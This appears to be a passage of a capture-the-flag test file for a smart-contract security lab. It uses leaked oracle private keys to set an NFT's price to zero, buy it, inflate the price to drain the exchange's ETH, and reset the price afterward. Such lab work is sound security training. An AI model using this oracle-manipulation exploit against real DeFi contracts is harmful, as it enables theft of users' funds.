...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        const oracle1 = new ethers.Wallet(privateKeys[0], ethers.provider)
        const oracle2 = new ethers.Wallet(privateKeys[1], ethers.provider)

        const tokenSymbol = await nftToken.symbol()
        await oracle.connect(oracle1).postPrice(tokenSymbol, 0)
        await oracle.connect(oracle2).postPrice(tokenSymbol, 0)

        await exchange.connect(player).buyOne({value: 1})

        await oracle.connect(oracle1).postPrice(tokenSymbol, EXCHANGE_INITIAL_ETH_BALANCE)
        await oracle.connect(oracle2).postPrice(tokenSymbol, EXCHANGE_INITIAL_ETH_BALANCE)

        await nftToken.connect(player).approve(exchange.address, 0)
        await exchange.connect(player).sellOne(0)

        await oracle.connect(oracle1).postPrice(tokenSymbol, INITIAL_NFT_PRICE)
        await oracle.connect(oracle2).postPrice(tokenSymbol, INITIAL_NFT_PRICE)
    });
